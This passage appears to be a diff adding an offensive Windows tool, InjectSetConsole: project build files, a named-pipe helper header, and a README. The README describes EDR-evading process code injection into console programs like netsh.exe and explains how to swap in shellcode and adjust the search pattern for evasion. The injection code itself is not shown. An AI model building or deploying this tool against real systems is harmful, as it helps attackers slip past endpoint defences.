+    <Link>
+      <SubSystem>Console</SubSystem>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemGroup>
+    <ClCompile Include="InjectSetConsole.cpp" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="InjectHelp.h" />
+    <ClInclude Include="PipeExchange.h" />
+  </ItemGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
+  <ImportGroup Label="ExtensionTargets">
+  </ImportGroup>
+</Project>
+```
+
+`InjectSetConsole.vcxproj.filters`:
+
+```filters
+<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup>
+    <Filter Include="Source Files">
+      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
+      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
+    </Filter>
+    <Filter Include="Header Files">
+      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
+      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
+    </Filter>
+    <Filter Include="Resource Files">
+      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
+      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
+    </Filter>
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="InjectSetConsole.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="PipeExchange.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="InjectHelp.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+  </ItemGroup>
+</Project>
+```
+
+`PipeExchange.h`:
+
+```h
+#pragma once
+#include <windows.h>
+#include <iostream>
+#include <string>
+#include <vector>
+#include <sstream>
+
+// Helper function to safely read available data from the pipe without blocking
+std::string ReadFromPipe(HANDLE hPipeRead) {
+    DWORD bytesAvailable = 0;
+    if (!PeekNamedPipe(hPipeRead, NULL, 0, NULL, &bytesAvailable, NULL) || bytesAvailable == 0) {
+        return "";
+    }
+
+    std::vector<char> buffer(bytesAvailable + 1, 0);
+    DWORD bytesRead = 0;
+    if (ReadFile(hPipeRead, buffer.data(), bytesAvailable, &bytesRead, NULL) && bytesRead > 0) {
+        return std::string(buffer.data(), bytesRead);
+    }
+    return "";
+}
+
+// Helper function to send interactive commands to the child process
+bool WriteToPipe(HANDLE hPipeWrite, const std::string& command) {
+    DWORD bytesWritten = 0;
+    return WriteFile(hPipeWrite, command.c_str(), static_cast<DWORD>(command.length()), &bytesWritten, NULL);
+}
+
+bool WriteToPipeBin(HANDLE hPipeWrite, BYTE* buff, DWORD size)
+{
+    DWORD bytesWritten = 0;
+    return WriteFile(hPipeWrite, buff, size, &bytesWritten, NULL);
+}
+```
+
+`README.md`:
+
+```md
+# InjectSetConsole
+
+**InjectSetConsole** performs process code injection by leveraging a **Windows named pipe**.
+
+Unlike traditional techniques, **it does not use the VirtualAllocEx and WriteProcessMemory APIs**.
+
+### Command Line Syntax
+
+**InjectSetConsole.exe `<executable_path`>**
+
+**executable_path**: netsh.exe, nslookup.exe,... or other nteractive console program
+
+_Example: InjectSetConsole.exe C:\Windows\System32\netsh.exe_
+
+To use different shellcode, replace the bytes starting at offset **0x19** (hexadecimal) in the **rawData** array.
+
+Alternatively, you can modify the search pattern to improve evasion.
+
+## Links
+
+[EDR Evasion: Process Injection Without WriteProcessMemory](https://www.zerosalarium.com/2026/09/edr-evasion-process-injection-without-WriteProcessMemory.html)
+
+
+## Demo Video
+
+Youtube: [https://youtu.be/DCUnbj_usPM](https://youtu.be/DCUnbj_usPM)
+
+
+## 🐦 Enjoying my work? Support the journey by following me on X
+
+[![Twitter Follow](https://img.shields.io/twitter/follow/TwoSevenOneT?style=for-the-badge&logo=x&color=000)](https://x.com/TwoSevenOneT)
+
+## Author:
+
+[Two Seven One Three](https://x.com/TwoSevenOneT)
+
+```
